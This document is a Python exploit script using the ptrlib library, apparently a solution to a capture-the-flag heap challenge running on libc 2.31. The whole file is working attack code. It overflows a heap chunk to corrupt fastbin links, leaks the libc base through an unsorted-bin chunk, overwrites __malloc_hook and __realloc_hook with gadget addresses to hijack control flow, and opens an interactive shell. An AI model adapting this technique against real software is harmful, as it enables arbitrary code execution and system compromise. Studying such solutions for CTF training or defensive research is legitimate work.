import os
from ptrlib import *

def add(index, size, data):
    sock.sendlineafter(": ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
    sock.sendlineafter(": ", data)
def edit(index, offset, size, data):
    sock.sendlineafter(": ", "2")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(offset))
    sock.sendlineafter(": ", str(size))
    sock.sendlineafter(": ", data)
def show(index):
    sock.sendlineafter(": ", "3")
    sock.sendlineafter(": ", str(index))
    return sock.recvlineafter(": ")
def delete(index):
    sock.sendlineafter(": ", "4")
    sock.sendlineafter(": ", str(index))

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9003")

libc = ELF("../distfiles/libc-2.31.so")
#sock = Process("../distfiles/chall")
sock = Socket(HOST, int(PORT))

# use up tcache
for i in range(7):
    add(0, 0x48, "A")
    delete(0)
    add(0, 0x18, "B")
    delete(0)

# fastbin corruption
add(0, 0x18, "heap overflow")
add(1, 0x48, "fastbin link to be overwritten")
add(2, 0x48, p64(0)*7 + p64(0x51))
add(3, 0x418, "for libc leak")
delete(0)
add(0, 0x28, "avoid consolidation")
delete(0)
add(0, 0x18, "heap overflow")
delete(2)
delete(1)
edit(0, 0x20, 0x7fffffff, "\x50")

# libc leak
add(1, 0x48, "dummy")
add(2, 0x48, p64(0) + p64(0x421))
delete(3)
libc_base = u64(show(2)[0x10:0x18]) - libc.main_arena() - 0x60
libc.set_base(libc_base)
delete(1)
delete(0)

# fastbin corruption
add(0, 0x68, "fastbin link to be overwritten")
for i in range(7):
    add(1, 0x68, "C")
    delete(1)
delete(0)
edit(2, 0, 0x20, p64(0) + p64(0x71) + p64(libc.symbol('__malloc_hook') - 0x33))

# overwrite malloc hook
onegadget_r15_r12 = libc_base + 0xe6c7e
cop_mov_r12_r9_mov_rsi_rbx_call_realloc = libc_base + 0x6b601
add(0, 0x68, "dummy")
payload  = b"AAA" + p64(0)*3
payload += p64(onegadget_r15_r12) # __realloc_hook
payload += p64(cop_mov_r12_r9_mov_rsi_rbx_call_realloc) # __malloc_hook
add(1, 0x68, payload)

# win
sock.sendlineafter(": ", "1")
sock.sendlineafter(": ", "3")
sock.sendlineafter(": ", "123")

sock.interactive()
